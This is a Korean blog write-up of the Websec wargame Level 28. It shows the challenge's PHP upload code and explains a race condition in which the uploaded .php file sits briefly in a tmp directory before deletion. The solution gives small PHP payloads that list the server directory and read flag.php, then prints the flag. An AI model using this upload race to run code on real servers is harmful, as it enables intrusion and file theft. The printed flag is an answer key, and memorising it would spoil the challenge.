---
title : "Websec - Level 28 (풀이봄)"
categories : [Wargame, Websec]
tags: [websec, websec level 28 writeup, race condition, 풀이 봄]
---

## Level 28
<hr style="border-top: 1px solid;"><br>

``` php
<?php
if(isset($_POST['submit'])) 
{
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

  file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) 
  {
    include($filename);  // it contains the `$flag` variable
  } 
  else 
  {
    $flag = "Nope, $filename is not the right file, sorry.";
    sleep(1);  // Deter bruteforce
  }

  unlink($filename);
}
?>

Select file <input type='file' name='flag_file' id='flag_file' hidden class="hidden">
<input type='text' name='checksum' id='checksum' class="form-control">
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

우선 우리는 파일에 대해 검사를 하는 if문을 만족시킬 수 없으므로 우회를 해야함. 

else 문을 보면 sleep(1) 코드가 있고 else문이 끝나고 unlink를 함.

즉, 1초 약간 넘는 시간동안은 파일을 볼 수 있다는 소리가 됨. 이런 기법을 ```Race Condition``` 이라고 함. 

<br>

flag.php의 내용을 출력해주는 php 파일을 작성해야 한다.

테스트로 현재 경로에 어떤 파일과 디렉토리가 있는지 확인해보았다.

파일을 업로드 후 출력되는 tmp경로로 바로 확인을 해주면 출력값이 나온다.

<br>

```php
<?php
	scandir('/');
?>

# result
# Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php [4] => php-fpm.sock [5] => source.php [6] => tmp )
```

<br>

따라서 flag.php의 내용을 출력해주면 된다.

<br>

```php
<?php
	$flag = file_get_contents('/flag.php');
	echo $flag;
  // echo file_get_contents('/flag.php');
  // echo file_get_contents('./flag.php'); -> 안됌
?>

# result
# $flag = 'WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}';
```

<br><br>
<hr style="border: 2px solid;">
<br><br>
